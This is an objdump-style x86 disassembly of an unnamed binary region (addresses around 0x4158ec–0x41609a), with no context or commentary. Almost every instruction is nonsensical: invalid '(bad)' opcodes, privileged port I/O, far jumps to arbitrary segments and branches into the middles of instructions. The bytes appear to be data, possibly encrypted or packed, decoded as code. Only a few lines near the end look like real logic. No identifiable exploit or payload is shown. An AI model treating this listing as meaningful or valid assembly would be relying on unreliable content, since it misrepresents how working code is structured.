  4158ec:	xor    BYTE PTR [edx],dh
  4158ee:	mov    ebx,0x344b2188
  4158f3:	sbb    eax,DWORD PTR [edi+0x24]
  4158f6:	sahf   
  4158f7:	ins    DWORD PTR es:[edi],dx
  4158f8:	stos   DWORD PTR es:[edi],eax
  4158f9:	push   es
  4158fa:	push   edi
  4158fb:	ret    0x9d39
  4158fe:	(bad)  
  4158ff:	mov    ecx,0x5ffef740
  415904:	fimul  WORD PTR [ebx]
  415906:	in     al,dx
  415907:	mov    edx,0x4be3ebf4
  41590c:	push   ebx
  41590d:	adc    al,0xa8
  41590f:	in     al,dx
  415910:	sti    
  415911:	xor    dh,BYTE PTR [ecx-0x4ca59c1b]
  415917:	jmp    0x1ad57654
  41591c:	cmp    DWORD PTR [ebp+0x2554003d],edi
  415922:	dec    ebp
  415923:	bound  ebp,QWORD PTR [eax-0x25d6cfb0]
  415929:	jne    0x415940
  41592b:	sahf   
  41592c:	add    DWORD PTR [esi+edi*4],eax
  41592f:	std    
  415930:	and    DWORD PTR [esi+ebp*2],ebp
  415933:	repnz in eax,dx
  415935:	sub    al,0xb9
  415937:	sbb    al,0xe5
  415939:	imul   edx,DWORD PTR [esi-0x5b],0xd3d7d81d
  415940:	(bad)  
  415941:	outs   dx,DWORD PTR ds:[esi]
  415942:	sub    eax,0xd841ceb
  415947:	jmp    0x4159af
  415949:	push   ecx
  41594a:	gs cmp al,0x9f
  41594d:	stc    
  41594e:	jbe    0x415939
  415950:	cdq    
  415951:	ss std 
  415953:	daa    
  415954:	out    dx,al
  415955:	and    al,0x35
  415957:	pop    es
  415958:	dec    ebx
  415959:	inc    ebp
  41595a:	pop    es
  41595b:	inc    esp
  41595c:	jmp    0x46d1:0x3869a97b
  415963:	add    edi,edx
  415965:	stos   DWORD PTR es:[edi],eax
  415966:	ror    edi,1
  415968:	mov    DWORD PTR [esp+ecx*8-0x2d],esp
  41596c:	retf   0x5d
  41596f:	int    0x68
  415971:	jo     0x41596b
  415973:	enter  0x1dae,0x9e
  415977:	jge    0x4159e0
  415979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41597a:	fistp  QWORD PTR ds:[eax-0x259d862b]
  415981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415982:	je     0x415989
  415984:	mov    dl,0x1
  415986:	cs push ss
  415988:	into   
  415989:	jns    0x415963
  41598b:	scas   al,BYTE PTR es:[edi]
  41598c:	mov    ds:0x39df5913,eax
  415991:	mov    ds:0xd196538c,eax
  415996:	sar    BYTE PTR [ecx-0x62],1
  415999:	jp     0x415946
  41599b:	sar    BYTE PTR [ecx],0x9d
  41599e:	pop    esp
  41599f:	jle    0x415999
  4159a1:	imul   esp,DWORD PTR [esi],0x1c01a948
  4159a7:	xchg   DWORD PTR [edx+0x2],ecx
  4159aa:	fimul  WORD PTR [edi+0x6c4aff09]
  4159b0:	jmp    0x41593a
  4159b2:	sbb    BYTE PTR [eax],dh
  4159b4:	cmp    edi,DWORD PTR [esi+esi*2]
  4159b7:	sti    
  4159b8:	adc    ebp,DWORD PTR [ecx+ebx*2+0x2842b031]
  4159bf:	xchg   ebp,eax
  4159c0:	jnp    0x4159fa
  4159c2:	mov    eax,0xea310b5a
  4159c7:	mov    dl,0x96
  4159c9:	ds test al,0xb5
  4159cc:	pop    es
  4159cd:	pop    edi
  4159ce:	xor    BYTE PTR [eax+0x7c64f46d],dh
  4159d4:	lea    edx,[edi+esi*4-0x66f3c0]
  4159db:	ror    BYTE PTR [eax],1
  4159dd:	cwde   
  4159de:	lds    esi,FWORD PTR [bx+0x2b37]
  4159e3:	aad    0xfc
  4159e5:	jno    0x4159a2
  4159e7:	add    eax,0xe6c35c36
  4159ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159ed:	addr16 mov ebx,0x67e43dab
  4159f3:	(bad)  
  4159f4:	dec    edi
  4159f5:	mov    esi,0xad7f5b65
  4159fa:	push   es
  4159fb:	and    al,BYTE PTR [ebx+ecx*2]
  4159fe:	push   edx
  4159ff:	rcl    DWORD PTR [esi-0x2c],0xa0
  415a03:	push   ss
  415a04:	nop
  415a05:	xchg   BYTE PTR [esi+0x62],ah
  415a08:	sbb    al,0x9b
  415a0a:	lock arpl WORD PTR [ebp-0x1771e4ef],si
  415a11:	retf   
  415a12:	leave  
  415a13:	jb     0x4159d7
  415a15:	sub    eax,0x36b97c54
  415a1a:	mov    DWORD PTR ds:0x73e3a970,eax
  415a20:	pushf  
  415a21:	and    al,0x98
  415a23:	push   esp
  415a24:	xchg   edi,eax
  415a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a27:	ds icebp 
  415a29:	(bad)  
  415a2a:	stos   DWORD PTR es:[edi],eax
  415a2b:	inc    ebp
  415a2c:	(bad)  
  415a2d:	loopne 0x4159d4
  415a2f:	or     BYTE PTR [ebp+0x48],bl
  415a32:	(bad)  
  415a33:	push   esp
  415a34:	test   eax,0x9c12c7d9
  415a39:	cdq    
  415a3a:	mov    ah,0xd7
  415a3c:	inc    ebp
  415a3d:	xor    DWORD PTR [ecx-0x7b1d2782],eax
  415a43:	and    ch,BYTE PTR [ebx+ebx*2+0x3d]
  415a47:	and    esi,DWORD PTR [edi]
  415a49:	icebp  
  415a4a:	xor    DWORD PTR [esp+ebp*4-0x4bd72513],0x6eea1daf
  415a55:	sti    
  415a56:	int3   
  415a57:	mov    esp,0x520e804b
  415a5c:	adc    esi,DWORD PTR [esi-0x43]
  415a5f:	mov    al,ds:0x80efb6da
  415a64:	inc    ebp
  415a65:	stos   DWORD PTR es:[edi],eax
  415a66:	popf   
  415a67:	mov    ecx,0x36cd3677
  415a6c:	pushf  
  415a6d:	jmp    0x20f28fd2
  415a72:	jmp    0xf53ade99
  415a77:	cs loope 0x415a53
  415a7a:	movaps xmm5,XMMWORD PTR [edi-0x44]
  415a7e:	data16 int 0xfb
  415a81:	xchg   ebp,eax
  415a82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a83:	fs sub BYTE PTR cs:[eax-0x40],dl
  415a88:	push   ds
  415a89:	lea    esi,[ebx]
  415a8b:	ror    DWORD PTR [ebp+0x729c0284],1
  415a91:	xor    al,BYTE PTR [eax]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	jb     0x415ae9
  415aa6:	loop   0x415b12
  415aa8:	mov    eax,0xb9707f0d
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415ab8
  415ab1:	push   DWORD PTR [esi+0x66]
  415ab4:	popf   
  415ab5:	mov    eax,0xa39b051a
  415aba:	jp     0x415aad
  415abc:	or     al,BYTE PTR [edi+0x3f]
  415abf:	iret   
  415ac0:	cs jo  0x415b34
  415ac3:	call   0x2b9d22
  415ac8:	xchg   esp,eax
  415ac9:	and    esi,DWORD PTR [eax+esi*8+0x164bc39b]
  415ad0:	xor    DWORD PTR [edi+0x7e232e9c],eax
  415ad6:	test   eax,0x43fee504
  415adb:	mov    ebp,0x6ef082d4
  415ae0:	inc    edi
  415ae1:	mov    al,ds:0xe24fe305
  415ae6:	sub    BYTE PTR [edi-0x56],ch
  415ae9:	sbb    al,0x9d
  415aeb:	ret    0xe0a0
  415aee:	hlt    
  415aef:	sub    ch,BYTE PTR [esi-0x62]
  415af2:	jecxz  0x415ade
  415af4:	(bad)  
  415af5:	jbe    0x415aad
  415af7:	packuswb mm3,mm5
  415afa:	or     BYTE PTR [esi],al
  415afc:	(bad)  
  415afd:	in     eax,0xb5
  415aff:	outs   dx,BYTE PTR ds:[esi]
  415b00:	clc    
  415b01:	enter  0xf44a,0x37
  415b05:	leave  
  415b06:	cmp    bl,BYTE PTR [edi]
  415b08:	ins    DWORD PTR es:[edi],dx
  415b09:	fistp  QWORD PTR [edx+0x19eda8af]
  415b0f:	aas    
  415b10:	fs pop es
  415b12:	adc    DWORD PTR ds:0xe46b48af,0x6b8a603a
  415b1c:	jno    0x415b7e
  415b1e:	repnz addr16 ss mov bl,0xbc
  415b23:	out    dx,eax
  415b24:	mov    ebp,0x3b75d6b9
  415b29:	cmp    DWORD PTR [ecx+0x679423bd],0x7b180dcf
  415b33:	sbb    eax,0x288a2965
  415b38:	mov    ebx,ecx
  415b3a:	ja     0x415aea
  415b3c:	add    ch,BYTE PTR [ebx+ebp*8-0xb633787]
  415b43:	std    
  415b44:	cmc    
  415b45:	(bad)  
  415b46:	jb     0x415b09
  415b48:	out    0x9d,al
  415b4a:	mov    esp,0xc800c7d6
  415b4f:	sub    eax,0x63fd15f8
  415b54:	xchg   ebp,eax
  415b55:	jne    0x415b70
  415b57:	mov    edi,esi
  415b59:	imul   esi,DWORD PTR [edx+ebp*1-0x6b],0xffffffcd
  415b5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b5f:	push   esp
  415b60:	mov    ebp,0x6c80d5e7
  415b65:	aad    0x8e
  415b67:	seto   BYTE PTR [eax+0x457c50fa]
  415b6e:	nop
  415b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b71:	inc    ecx
  415b72:	ja     0x415b41
  415b74:	aad    0x91
  415b76:	je     0x415b6e
  415b78:	repnz mov esi,0x57bd2542
  415b7e:	sbb    cl,al
  415b80:	pop    ebp
  415b81:	addr16 dec edi
  415b83:	adc    al,0x36
  415b85:	push   ecx
  415b86:	or     al,0x27
  415b88:	mov    ds:0xac06b22f,al
  415b8d:	loopne 0x415b9a
  415b8f:	push   0x5f
  415b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b92:	(bad)  
  415b94:	pop    ds
  415b95:	(bad)  
  415b96:	and    edi,ecx
  415b98:	xchg   esi,eax
  415b99:	or     DWORD PTR [ecx+edi*1+0x5d],esp
  415b9d:	pop    ebx
  415b9e:	dec    edx
  415b9f:	jmp    0x71f55c40
  415ba4:	pop    edx
  415ba5:	xchg   ebp,eax
  415ba6:	mov    dl,0xb6
  415ba8:	push   ds
  415ba9:	sub    eax,0x317e488e
  415bae:	inc    edx
  415baf:	retf   
  415bb0:	or     ah,ah
  415bb2:	mov    ebp,0xb93c7d78
  415bb7:	pop    ebp
  415bb8:	fimul  DWORD PTR [edi-0x4631a768]
  415bbe:	mov    cl,0xd
  415bc0:	push   ebp
  415bc1:	hlt    
  415bc2:	shl    DWORD PTR [edx-0x69140e07],0x3a
  415bc9:	jg     0x415c37
  415bcb:	jne    0x415bbd
  415bcd:	jmp    0x415bda
  415bcf:	aaa    
  415bd0:	adc    bh,BYTE PTR [ebx+0x15]
  415bd3:	add    DWORD PTR [edx+0x3ac262eb],esi
  415bd9:	test   BYTE PTR [edi-0x4d],0xdd
  415bdd:	cmp    DWORD PTR [ebx-0x3c264c24],edi
  415be3:	xlat   BYTE PTR ds:[ebx]
  415be4:	dec    eax
  415be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415be7:	mov    ds,edx
  415be9:	mov    esi,0xf1a6dd37
  415bee:	shl    DWORD PTR [edx-0x1d2183a2],1
  415bf4:	stos   BYTE PTR es:[edi],al
  415bf5:	jge    0x415c12
  415bf7:	repz fdivp st(1),st
  415bfa:	test   BYTE PTR ds:0x962d42d6,dl
  415c00:	sbb    al,0xdc
  415c02:	shrd   DWORD PTR [ecx+ebx*2+0x33265353],ebp,0x63
  415c0b:	lea    esp,[ebx+esi*4-0x1d]
  415c0f:	sar    DWORD PTR [ebp+0x7c],1
  415c12:	mov    ds:0x957c7212,eax
  415c17:	xchg   edx,eax
  415c18:	lock lock int3 
  415c1b:	xchg   esi,eax
  415c1c:	pusha  
  415c1d:	sahf   
  415c1e:	cmp    ah,BYTE PTR [edi+ecx*8-0x3b]
  415c22:	inc    ebp
  415c23:	out    dx,eax
  415c24:	aam    0x34
  415c26:	adc    eax,0x9ecb3f7b
  415c2b:	in     eax,0x37
  415c2d:	dec    ebx
  415c2e:	sbb    eax,0xdcf44ae7
  415c33:	mov    ecx,DWORD PTR [esi-0x76]
  415c36:	out    0x56,al
  415c38:	js     0x415bfa
  415c3a:	xor    eax,0x49119f75
  415c3f:	int3   
  415c40:	dec    edx
  415c41:	adc    ecx,DWORD PTR [ebx+0x45]
  415c44:	scas   al,BYTE PTR es:[edi]
  415c45:	jns    0x415bda
  415c47:	jae    0x415c71
  415c49:	jl     0x415c39
  415c4b:	push   es
  415c4c:	leave  
  415c4d:	mov    bh,dh
  415c4f:	dec    ebx
  415c50:	sbb    al,0xcf
  415c52:	out    0x3a,eax
  415c54:	mov    eax,0xc6182fbe
  415c59:	shl    cl,1
  415c5b:	mov    dh,0x84
  415c5d:	in     eax,dx
  415c5e:	cwde   
  415c5f:	std    
  415c60:	(bad)  
  415c61:	aad    0x94
  415c63:	mov    cl,0xb1
  415c65:	sbb    dh,BYTE PTR [esi+0x4598ba8c]
  415c6b:	cld    
  415c6c:	mov    dh,0x39
  415c6e:	mov    ds:0xd53b8a0,al
  415c73:	jle    0x415c6d
  415c75:	jno    0x415c57
  415c77:	loopne 0x415cd0
  415c79:	cmp    DWORD PTR [esi+0x42],edx
  415c7c:	adc    eax,0x53c12047
  415c81:	loope  0x415c49
  415c83:	add    BYTE PTR ds:0x7944ce88,ah
  415c89:	in     eax,0xe
  415c8b:	add    edx,esp
  415c8d:	or     ah,al
  415c8f:	push   es
  415c90:	icebp  
  415c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c92:	inc    esi
  415c93:	sbb    eax,0x11d259cc
  415c98:	sub    eax,ecx
  415c9a:	push   0x38ad82b2
  415c9f:	test   DWORD PTR [ebx],edi
  415ca1:	jle    0x415c39
  415ca3:	add    bl,ah
  415ca5:	push   es
  415ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ca7:	stc    
  415ca8:	(bad)  
  415ca9:	out    0x8e,eax
  415cab:	jmp    0x372cd685
  415cb0:	scas   al,BYTE PTR es:[edi]
  415cb1:	pop    ss
  415cb2:	mov    eax,ds:0xfe935085
  415cb7:	ret    0xcf43
  415cba:	push   esi
  415cbb:	add    eax,0x30d12087
  415cc0:	adc    BYTE PTR [edi-0x25],dh
  415cc3:	jl     0x415cc3
  415cc5:	jbe    0x415c62
  415cc7:	and    al,0xe1
  415cc9:	fcos   
  415ccb:	cmc    
  415ccc:	push   es
  415ccd:	sbb    eax,0x6953d37e
  415cd2:	lds    edi,FWORD PTR [edi]
  415cd4:	jecxz  0x415cf6
  415cd6:	inc    esp
  415cd7:	and    esp,ebp
  415cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cda:	stos   BYTE PTR es:[edi],al
  415cdb:	or     BYTE PTR [edx],bh
  415cdd:	mov    esi,0xd03d8a80
  415ce2:	mov    bh,0x9c
  415ce4:	inc    ecx
  415ce5:	cmp    dh,BYTE PTR [edi]
  415ce7:	adc    ah,0xc1
  415cea:	add    DWORD PTR [ebx],0x2c
  415ced:	add    al,0x12
  415cef:	arpl   WORD PTR [edx+0x27],cx
  415cf2:	(bad)  
  415cf3:	pop    esi
  415cf4:	sbb    ebp,DWORD PTR [ebx]
  415cf6:	xchg   ebp,edi
  415cf8:	jp     0x415c9a
  415cfa:	lds    esi,FWORD PTR [ecx-0x63]
  415cfd:	lock and ebp,DWORD PTR [esi-0xa]
  415d01:	push   0x5de1005b
  415d06:	mov    al,ds:0x12aab1c1
  415d0b:	dec    esi
  415d0c:	leave  
  415d0d:	pop    edx
  415d0e:	mov    eax,0xc455764d
  415d13:	loopne 0x415cb6
  415d15:	popa   
  415d16:	mov    eax,0x549ab3c8
  415d1b:	aaa    
  415d1c:	jae    0x415d75
  415d1e:	iret   
  415d1f:	in     eax,dx
  415d20:	int    0x1
  415d22:	mov    esi,0xdb2294c9
  415d27:	ror    bh,1
  415d29:	push   es
  415d2a:	repnz scas eax,DWORD PTR es:[edi]
  415d2c:	retf   0x728e
  415d2f:	add    al,0xac
  415d31:	int    0xc4
  415d33:	sbb    al,0xb6
  415d35:	out    0xfd,al
  415d37:	xchg   edi,eax
  415d38:	out    dx,eax
  415d39:	clc    
  415d3a:	outs   dx,DWORD PTR ds:[esi]
  415d3b:	cmp    DWORD PTR [edi],0xfffffff2
  415d3e:	adc    ch,bl
  415d40:	aad    0x66
  415d42:	pop    ds
  415d43:	fisub  DWORD PTR [edx]
  415d45:	(bad)  
  415d46:	js     0x415cd5
  415d48:	inc    ecx
  415d49:	ret    0xa113
  415d4c:	leave  
  415d4d:	popf   
  415d4e:	repnz fucomip st,st(5)
  415d51:	(bad)  
  415d52:	stc    
  415d53:	xor    al,0xed
  415d55:	cli    
  415d56:	ss aas 
  415d58:	mov    esp,ds
  415d5a:	lahf   
  415d5b:	test   BYTE PTR [ebx],0xa1
  415d5e:	cld    
  415d5f:	test   bl,dh
  415d61:	xor    al,0x7f
  415d63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d64:	or     al,0x34
  415d66:	cwde   
  415d67:	aas    
  415d68:	shl    BYTE PTR [ebx],cl
  415d6a:	call   0x4ffe:0xd663adb5
  415d71:	dec    ebp
  415d72:	jmp    0x558b:0x74f81772
  415d79:	or     BYTE PTR [ebx+0x489dc7d],cl
  415d7f:	xchg   edi,eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	jmp    0x8223c54f
  415d99:	or     bh,BYTE PTR [edi+0x70]
  415d9c:	mov    ecx,0x7b70707e
  415da1:	pop    es
  415da2:	mov    ds:0x1ee0ee3f,al
  415da7:	mov    ecx,0xcf587cf
  415dac:	lods   al,BYTE PTR ds:[esi]
  415dad:	out    0x8a,al
  415daf:	jecxz  0x415df5
  415db1:	inc    edi
  415db2:	lods   al,BYTE PTR ds:[esi]
  415db3:	ja     0x415d6c
  415db5:	inc    ecx
  415db6:	jno    0x415d72
  415db8:	fcompp 
  415dba:	mov    ch,0x2c
  415dbc:	stos   BYTE PTR es:[edi],al
  415dbd:	pop    edi
  415dbe:	mov    esi,DWORD PTR [ecx]
  415dc0:	or     al,0xd8
  415dc2:	xchg   edi,eax
  415dc3:	out    0x6a,eax
  415dc5:	push   ebp
  415dc6:	fwait
  415dc7:	pop    edx
  415dc8:	cmp    DWORD PTR [edx],ebp
  415dca:	aaa    
  415dcb:	popa   
  415dcc:	data16 cmp al,0x3e
  415dcf:	jae    0x415d93
  415dd1:	sub    ebx,ecx
  415dd3:	call   0xaa19:0x5d0fc887
  415dda:	clc    
  415ddb:	xchg   ch,ch
  415ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dde:	add    DWORD PTR [eax+0x6d],edi
  415de1:	push   0xffffffd2
  415de3:	imul   eax,esp,0x7e
  415de6:	jle    0x415da9
  415de8:	mov    ds:0xd6b9cdf5,al
  415ded:	jle    0x415d73
  415def:	call   0xf624:0xa674a53a
  415df6:	mul    esp
  415df8:	mov    esp,0xf61941ae
  415dfd:	inc    ebp
  415dfe:	test   ch,ch
  415e00:	mov    al,ds:0x2c172ca8
  415e05:	dec    ebx
  415e06:	adc    al,bl
  415e08:	and    DWORD PTR [edx+0x265900b8],eax
  415e0e:	daa    
  415e0f:	outs   dx,BYTE PTR ds:[esi]
  415e10:	fs sub esp,ebp
  415e13:	fsubr  QWORD PTR [ecx+edi*1-0x71]
  415e17:	hlt    
  415e18:	jbe    0x415e27
  415e1a:	xchg   ebp,eax
  415e1b:	adc    eax,0xafcef7b7
  415e20:	les    ebx,FWORD PTR [ebp-0x5f]
  415e23:	into   
  415e24:	aam    0x49
  415e26:	lods   al,BYTE PTR ds:[esi]
  415e27:	leave  
  415e28:	lea    ecx,[edx-0x42edb96d]
  415e2e:	dec    ebp
  415e2f:	les    ebx,FWORD PTR es:[edx-0x758c008]
  415e36:	in     al,dx
  415e37:	jb     0x415eaa
  415e39:	pusha  
  415e3a:	fwait
  415e3b:	out    0x66,eax
  415e3d:	loop   0x415dea
  415e3f:	or     eax,0xbe0225a
  415e44:	jb     0x415e27
  415e46:	mov    ecx,0x5456553e
  415e4b:	jp     0x415e51
  415e4d:	fsqrt  
  415e4f:	out    0x20,al
  415e51:	es inc edi
  415e53:	(bad)  
  415e54:	sar    ebp,1
  415e56:	outs   dx,BYTE PTR ds:[esi]
  415e57:	ror    DWORD PTR [edx+eax*2-0x1c],1
  415e5b:	es push 0x8ae45ad6
  415e61:	inc    ecx
  415e62:	sub    edx,DWORD PTR [ecx-0x2df38497]
  415e68:	mov    eax,ds:0x636b2034
  415e6d:	aam    0xda
  415e6f:	lds    ecx,FWORD PTR [ecx+0x58b3f268]
  415e75:	xchg   bx,ax
  415e77:	xor    al,0x5d
  415e79:	sbb    al,0xe4
  415e7b:	lock adc edi,ebx
  415e7e:	das    
  415e7f:	adc    BYTE PTR [ebx],dl
  415e81:	and    esp,DWORD PTR [edi+ebp*4-0x7ebae8c3]
  415e88:	dec    edx
  415e89:	enter  0x4bbf,0x91
  415e8d:	test   edi,ebx
  415e8f:	sbb    eax,0x7251b96f
  415e94:	ror    BYTE PTR [edi+0x8c2e7f0],1
  415e9a:	int3   
  415e9b:	jnp    0x415e94
  415e9d:	add    DWORD PTR [eax],0xffffffb4
  415ea0:	or     BYTE PTR [edi],dl
  415ea2:	scas   eax,DWORD PTR es:[edi]
  415ea3:	add    bl,bh
  415ea5:	cmp    DWORD PTR [eax],edx
  415ea7:	mov    al,0x79
  415ea9:	call   0x475b5da6
  415eae:	inc    eax
  415eaf:	adc    al,0x36
  415eb1:	add    BYTE PTR [ebp-0x6856f9cd],cl
  415eb7:	out    0xcc,eax
  415eb9:	hlt    
  415eba:	out    0xaf,al
  415ebc:	mov    ebp,0xb4626cc
  415ec1:	sub    eax,0x935c9ded
  415ec6:	fnstenv [eax+0x4589e018]
  415ecc:	mov    bl,0x17
  415ece:	retf   0x6578
  415ed1:	(bad)  
  415ed2:	outs   dx,BYTE PTR ds:[esi]
  415ed3:	jge    0x415ead
  415ed5:	(bad)  
  415ed6:	mov    al,0xb6
  415ed8:	xor    al,BYTE PTR [ecx+0x51]
  415edb:	inc    edx
  415edc:	ja     0x415f0d
  415ede:	push   ebp
  415edf:	xchg   edx,eax
  415ee0:	test   eax,0xb867cf7b
  415ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ee6:	jo     0x415e76
  415ee8:	leave  
  415ee9:	add    al,0x66
  415eeb:	sbb    ch,BYTE PTR [edi]
  415eed:	inc    ecx
  415eee:	jo     0x415f23
  415ef0:	sub    BYTE PTR [ecx],0x26
  415ef3:	mov    al,0x9f
  415ef5:	mov    al,ds:0xb1ccda70
  415efa:	push   ebp
  415efb:	jo     0x415ea9
  415efd:	sbb    al,0x82
  415eff:	retf   0xc2b4
  415f02:	dec    ebp
  415f03:	adc    BYTE PTR [ebp-0x40],ah
  415f06:	fdivr  QWORD PTR [ebp+ebx*4+0x46]
  415f0a:	ds aaa 
  415f0c:	dec    edx
  415f0d:	pop    esi
  415f0e:	dec    edx
  415f0f:	sub    eax,0xf73184be
  415f14:	pop    eax
  415f15:	sbb    eax,0x73db78c5
  415f1a:	les    edi,FWORD PTR [eax]
  415f1c:	push   edx
  415f1d:	or     dh,dl
  415f1f:	inc    ecx
  415f20:	cmp    bh,BYTE PTR [esi+edi*2-0x36]
  415f24:	sbb    DWORD PTR [esi],eax
  415f26:	jo     0x415f19
  415f28:	int3   
  415f29:	xchg   edi,eax
  415f2a:	hlt    
  415f2b:	mov    fs,WORD PTR [eax-0x4d98c4cb]
  415f31:	lods   al,BYTE PTR ds:[esi]
  415f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f33:	les    edi,FWORD PTR [esi+0x28d7ebae]
  415f39:	push   cs
  415f3a:	leave  
  415f3b:	out    dx,eax
  415f3c:	or     ebx,esp
  415f3e:	cld    
  415f3f:	jae    0x415ec9
  415f41:	or     dh,BYTE PTR [ebx+ecx*1+0x13]
  415f45:	pop    ss
  415f46:	ret    0x4c5d
  415f49:	sub    al,0x8e
  415f4b:	and    BYTE PTR [edi],al
  415f4d:	fnsave [ebp-0x1]
  415f50:	xchg   ebp,eax
  415f51:	or     dh,BYTE PTR [edx+0x4d55b938]
  415f57:	and    al,0xb4
  415f59:	sbb    dl,BYTE PTR [edi+esi*2]
  415f5c:	xchg   esi,eax
  415f5d:	mov    ebx,0x3277627c
  415f62:	loope  0x415f15
  415f64:	add    dl,BYTE PTR [ecx]
  415f66:	xor    BYTE PTR [eax],al
  415f68:	mov    ds:0x6f1b49f1,al
  415f6d:	scas   al,BYTE PTR es:[edi]
  415f6e:	dec    esp
  415f6f:	js     0x415f46
  415f71:	in     al,dx
  415f72:	cdq    
  415f73:	shr    DWORD PTR ds:0xf63638f1,1
  415f79:	cmp    eax,0xc678d5aa
  415f7e:	ds xchg ecx,eax
  415f80:	fnsave [esi-0x53]
  415f83:	sbb    eax,0x88736f66
  415f88:	js     0x415fc4
  415f8a:	pop    ebp
  415f8b:	and    al,0xfb
  415f8d:	in     eax,0xc3
  415f8f:	dec    esi
  415f90:	lds    ebx,FWORD PTR [ecx+0x65e6c586]
  415f96:	add    al,0x54
  415f99:	mov    WORD PTR [ebx+0x11921623],es
  415f9f:	cmp    ah,BYTE PTR [ebx]
  415fa1:	pop    edx
  415fa2:	(bad)  
  415fa3:	sub    DWORD PTR [edx+0x6c],ebx
  415fa6:	enter  0x7a6f,0xcc
  415faa:	adc    eax,0x84a2b080
  415faf:	cmp    al,0xb9
  415fb1:	cmp    al,dh
  415fb3:	into   
  415fb4:	mov    ebx,0xd807c335
  415fb9:	xchg   ebp,eax
  415fba:	sub    DWORD PTR [edx+0x7],edx
  415fbd:	fs pop ss
  415fbf:	test   DWORD PTR [eax+0x32],ecx
  415fc2:	cld    
  415fc3:	xlat   BYTE PTR ds:[ebx]
  415fc4:	push   ss
  415fc5:	pop    ecx
  415fc6:	repnz adc edx,DWORD PTR [edi+0x2c]
  415fca:	out    0x5b,eax
  415fcc:	shl    DWORD PTR [edi-0x5b],0xda
  415fd0:	cwde   
  415fd1:	in     eax,dx
  415fd2:	cld    
  415fd3:	out    0x91,al
  415fd5:	rcr    BYTE PTR [ecx+edi*4],cl
  415fd8:	xchg   ebx,eax
  415fd9:	shl    BYTE PTR [esi-0x63d2dab8],0x79
  415fe0:	add    eax,0x491118fb
  415fe5:	stc    
  415fe6:	out    dx,eax
  415fe7:	fcom   DWORD PTR [edx]
  415fe9:	psubsb mm0,QWORD PTR [eax]
  415fec:	out    dx,eax
  415fed:	mov    ebp,0x59faaabd
  415ff2:	xchg   edi,eax
  415ff3:	fdivr  QWORD PTR [ebx+0x3423ec07]
  415ff9:	int3   
  415ffa:	fcom   QWORD PTR [esi+ebx*8]
  415ffd:	pop    edi
  415ffe:	inc    esp
  415fff:	sahf   
  416000:	repnz shl DWORD PTR [ebp-0x6e7185fe],0xd9
  416008:	fwait
  416009:	inc    ecx
  41600a:	outs   dx,DWORD PTR ds:[esi]
  41600b:	ret    0xaa52
  41600e:	inc    esp
  41600f:	sub    DWORD PTR [edi-0x29b13084],esp
  416015:	(bad)  
  416016:	aad    0x42
  416018:	sbb    dl,al
  41601a:	xor    BYTE PTR [eax],ch
  41601c:	sbb    BYTE PTR [edi],bh
  41601e:	fidivr WORD PTR [edi]
  416020:	aaa    
  416021:	or     eax,0x9faee25b
  416026:	lods   eax,DWORD PTR ds:[esi]
  416027:	pusha  
  416028:	hlt    
  416029:	loopne 0x415fea
  41602b:	leave  
  41602c:	pop    eax
  41602d:	fs cdq 
  41602f:	sub    DWORD PTR [ebx+0x6a],eax
  416032:	rcr    DWORD PTR [esi],cl
  416034:	or     eax,0x1f495bf7
  416039:	or     eax,DWORD PTR [ebp-0x41]
  41603c:	dec    edx
  41603d:	test   BYTE PTR [esi],ch
  41603f:	add    al,0x2e
  416041:	mov    edx,0xc7d92e4f
  416046:	sti    
  416047:	push   0xf7c92a34
  41604c:	stos   DWORD PTR es:[edi],eax
  41604d:	push   es
  41604e:	clc    
  41604f:	mov    esi,0x1faacb8a
  416054:	cmp    esp,DWORD PTR [esp+edi*8-0x438fed15]
  41605b:	inc    edi
  41605c:	out    dx,eax
  41605d:	cli    
  41605e:	fnstcw WORD PTR [edx-0x21]
  416061:	inc    ebx
  416062:	test   al,0xfb
  416064:	out    dx,al
  416065:	mov    BYTE PTR [edi],bh
  416067:	mov    edx,DWORD PTR [ebp+0x8]
  41606a:	xor    eax,ecx
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x416051
  41609a:	add    edi,DWORD PTR [ecx-0x4c]
